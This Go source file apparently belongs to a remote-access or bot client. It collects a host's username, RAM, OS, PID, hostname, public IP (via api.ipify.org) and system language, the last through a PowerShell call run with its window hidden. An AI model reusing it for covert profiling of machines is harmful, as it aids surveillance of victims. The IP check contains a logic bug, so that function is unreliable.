package Hardware

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"syscall"

	"github.com/pbnjay/memory"
)

var UID = "123456789"
var ComputerUsername = "N/A" // Define Variables
var ComputerRAM = "N/A"      // Define Variables
var OS = "N/A"
var PID = "N/A"
var Hostname = "N/A"
var ProcName = "Tiran"
var SysLan = "English"
var IP = "N/A"

type ipaddr struct {
	Ip string `json:"ip"`
}

func Getuid() {
	var chars = []rune("123456789qwertyuiopasdfghjklzxcvbnm")
	str := make([]rune, 10)

	for i := range str {
		str[i] = chars[rand.Intn(len(chars))]
	}

	UID = string(str)
}
func Getusername() {
	currentUser, err := user.Current() // Get Current User

	if err != nil {
		fmt.Print(err) // Print out error if occured
	}

	ComputerUsername = currentUser.Username // Set value ComputerUsername to the PC Username. ComputerUsername is earlier defined to  N/A. Wich stands for Not / Avaiable

}

func Getram() {
	ComputerRAM = fmt.Sprintf(`%d`, memory.TotalMemory()/1024/1024) // Module needs to bee reformated and recalculated to an actual readable ram
}

func GetOS() {
	OS = runtime.GOOS
}

func GetPID() {
	pid := os.Getpid()

	PID = fmt.Sprintf(`%d`, pid)

}

func GetProcessName() {
	path := os.Args[0]
	ProcName = filepath.Base(path)
}

func GetHostname() {
	hhostname, err := os.Hostname()
	if err != nil {
		Hostname = "Failed"
	} else {
		Hostname = hhostname
	}

}

func GetSystemLan() {
	cmd_path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd_instance := exec.Command(cmd_path, "(Get-WinUserLanguageList)[0].LocalizedName")
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	lan, err := cmd_instance.Output()
	if err != nil {
		SysLan = "Failed"
	} else {
		SysLan = string(lan)
	}

}

func GetIP() {
	req, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		IP = "Failed :("
	} else {
		defer req.Body.Close()

		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			IP = "Failed :("
			fmt.Println(err)

		} else {
			ip1 := ipaddr{}
			jsonErr := json.Unmarshal(body, &ip1)

			if jsonErr != nil {
				fmt.Print(err)
			}

			if ip1.Ip != "" {
				IP = "Failed :("
			}
			IP = ip1.Ip
			fmt.Println(ip1.Ip)

		}
	}

}
